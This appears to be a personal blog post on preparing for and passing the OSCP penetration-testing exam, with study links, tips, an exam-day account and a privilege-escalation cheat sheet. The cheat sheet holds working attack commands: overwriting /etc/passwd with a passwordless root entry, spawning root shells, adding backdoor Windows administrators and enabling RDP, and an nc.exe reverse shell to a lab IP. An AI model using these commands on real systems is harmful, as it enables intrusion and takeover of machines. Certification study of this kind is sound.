Methodology

1) Information - WWW, Google, whois
2) Service Enumeration - VPN, SNMP, Port Scanning, DNS, SMTP
3) Penetration - BOs, SQL
4) Maintaining Access - Trojan
5) House Keeping - Cleaning Up, Rootkits

Tips & Tricks

There are a lot of great OSCP summaries out there. Here are some of my favorite ones:

Initial scan for every box:

TCP: nmap -A -sV --script=default,vuln -p- --open -oA tcp_10.11.1.x 10.11.1.x

UDP: nmap -A -sV -sU --script=default,vuln --open -oA udp_10.11.1.x 10.11.1.x

https://github.com/jivoi/pentest (this is awesome!)

scan whole subnet and export .gnmap into an excel file while you are studying the materials.

Favorite 2 Summaries:

https://bitvijays.github.io/LFC-VulnerableMachines.html

https://guif.re/linuxeop && https://guif.re/windowseop

Learn tools which are not mentioned in the pdf

burp

nikto

cadaver

showmount -e

curl (this is probably the most important tool to understand and what you can do with it)

Personal Tips (for mac / linux)

Don't use a VMware player for accessing the websites etc

forward the ports and use burp on your host system

forward the ports and use the browsers on your host system

Iterm2 with splitpane is pure gold and infinite scrolling

Record your screen during the exam, if you miss something you can go back during the reporting and take the screenshots

Take breaks!

Join the discord grp if you are not a super genius who can learn everything by yourself quickly.

Threat the whole OSCP as a video game where you move from box to box to pwn everything.

One Note is by far the best tool to take notes imo.








Yes. Go to vulnhub and download the following machines:

Mr robot

Vulnos

Kioptrix

Sickos

Braindead

Stapler

If you root it or not. I highly recommend reading the mentioned walktroughs, you will learn different techniques for the same vulnerability.

For example if you have access to a wordpress site, some people like to edit the template to get a rev shell. i usually installed a plugin to get a rev shell and now you have 2 options and in case you don't have the permission to do one of those steps you can use the other one






Linux privesc step by step:

https://guif.re/linuxeop

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://github.com/TH3xACE/SUDO_KILLER



Windows privesc step by step:

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

http://www.fuzzysecurity.com/tutorials/16.html

https://guif.re/windowseop



Linux



Compile locally

gcc -o exp 9545.c -Wl,--hash-style=both



Read bash history:

echo: .bash_history

find -name ".bash_history" -exec cat {} \;



Override /etc/passwd:

-rwxrwxrwx. 1 root root 1306 Apr 21 2016 /etc/passwd

Echo root::0:0:root:/root:/bin/bash > /etc/passwd



Default checks:

find / -perm -u=s -type f 2>/dev/null



/usr/bin/pkexec su

pkexec python -c "import pty; pty.spawn('/bin/sh')"



sudo-l

cat /etc/exports



Kernel Exploits

Generic: https://github.com/lucyoa/kernel-exploits

FreeBSD 9.0: https://www.exploit-db.com/exploits/28718

Ubuntu 16.04: https://www.exploit-db.com/exploits/39772

Linux 2.6.9-89.EL: https://www.exploit-db.com/exploits/9545

Linux beta 3.0.0-12-generic: https://gist.github.com/karthick18/1686299

Linux core 2.6.32-21: https://www.exploit-db.com/exploits/14814/

Diverse unix: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2009/CVE-2009-2692/2.6.18.c & https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack

Diverse windows: https://github.com/jivoi/pentest/blob/master/exploit_win/win_local_exploits.md



Windows

Windows add new administrator

net user /add oscp attacker

net localgroup administrators oscp/add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f



Authority/network service (asp.net shell)

Upload /usr/share/sqlninja/apps/churrasco.exe

churrasco -d "net user /add oscp oscp "

churrasco -d "net localgroup administrators oscp /add"

churrasco -d "NET LOCALGROUP "Remote Desktop Users" oscp/ADD"



Windows XP SP1 and earlier

sc config upnphost binpath= "C:\Inetpub\nc.exe -nv 10.11.0.128 5555 -e C:\Windows\system32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc config upnphost depend= ""

sc qc upnphost

http://www.fuzzysecurity.com/tutorials/16.html





check application:

wmic_info.bat (http://www.fuzzysecurity.com/scripts/13.html)

nmap: sudo nmap –interactive --> !sh

mysql: https://github.com/amonsec/exploit/blob/master/linux/privs/MysqlUDF/mysql_udf_exploit.sh



MS16032 --> check optimum write up htb

Exploit suggester: https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester

https://github.com/amonsec/exploit/tree/master/windows/privs

checklist: https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md


Here’s a list of the things you need to learn to get prepared for OSCP:

Linux and Windows Environment - You need to be familiar with both. These will help you spot clues for privilege escalation. I’m a Windows guy and during the labs, I learned Linux the hard way.
Linux and Windows Commands - Knowing Linux and Windows commands helps a lot. Brush up on them!
Basic Programming Skills - Expect to debug and rewrite exploits, so know Bash Scripting. This will help you to automate redundant tasks.
Web application attacks (SQLi, XSS, Local File Inclusion, Remote File Inclusion, and Command Execution) - Expect a lot of web application content in the labs. Also, practice bypassing web security filters for injection attacks.
Metasploit Framework – Brush up on creating payloads with different formats, using multi handlers, and using staged vs non-staged payloads. Knowing these things will save you some time during your exam.
Nmap - Different scanning techniques and Nmap NSE Scripts will help you a lot during your lab or exam.
Netcat and Ncat - You’ll be using these a lot during the OSCP.
Wireshark and tcpdump - Those are important because you’ll be using Wireshark to debug your exploit - or tcpdump, when machines don’t have a GUI.
Windows and Linux Privilege Escalation - Aside from using kernel exploits, brush up on misconfigurations like weak service/file permissions and NFS/Shares.
Escaping restricted shells and spawning shells - You’ll encounter these a lot during your OSCP.
File transfer - It is important that you know the different techniques to transfer files to a target machine.
Aside from those topics, these books will also come in handy:

Kali Linux Revealed - To freshen up your Linux Fundamentals.
Penetration Testing: A Hands-on Introduction to Hacking - One of my favorite books. This book covers almost all the aspects of what the OSCP entails.
Web Application Hackers Handbook - I highly suggest reading this book, especially if you’re new to web application penetration testing. The book covers web application attacks from attacking access controls, application logic, and application servers.
Rtfm: Red Team Field Manual - This is a great cheat sheet for pen testers.
Hacking: The Art of Exploitation 2nd Edition - This book covers deeper knowledge about penetration testing. 


Exam Plan

My gameplan was:

start with BoF (60min)

run scans in the meantime

go on with 10p machine

go on with 25p machine

select easier looking 20p machine.

If stuck for 2h move on to other machine

take a 5-10min break every 90min.

Everything went quite according to plan. I rooted the first machine in around 45min and took a break to drink a big smoothie. Once I came back I checked my scans and saw 4 out of 5 machines were windows based... Never the less I found an easy way to root the 10p machine and 10min later this one was done as well. I made sure I took good screenshots and edited my notes. Now at 6.30am I had 35p. Time for the 25p machine. Since my linux privesc skills are way better than windows I knew I need the full 25p here. I invested a couple hours and knew where to enter but it didn't really work out. During the lunch break I had an idea and after that 1h break I had a low shell. The privesc part was not that easy but around 2pm that machine was rooted and I had 60points. Now I need one more machine and I should be fine. On the first machine I didn't find anything for 2h so I moved on to the last 20p machine and had a low limit shell after around 30min. Since no one knows how many points you get for low priv shell I just knew that I'm either super close at passing right now or super close below passing until 8pm I enumerated between both machines to get another low priv shell or full admin. Unfortunately, I was not able to move any further. I found nothing which could even help me so I decided to go to bed. At 2am I got up, drank a big shake and went back into the exam for the last 3hours. I found some small things which might help but I did not achieve a full root or another low shell once the VPN closed at 5am.



Report

I knew that offsec takes the report very seriously and I told myself that this can be my chance to impress them in case it's a coin flip between passing and failing. I took some time off until 10pm and started with the report. I'm pretty good with documentation and after 11h with some breaks, I had a beautiful 33 page report. It might sound rather short compared to how long others report were but I'm pretty sure it was the most beautiful one they received that day :D. I made sure the report was in the right format and encrypted with the required password.

24h hours later after waking up I checked my email and received the confirmation that I passed the exam. Feelsgoodman!
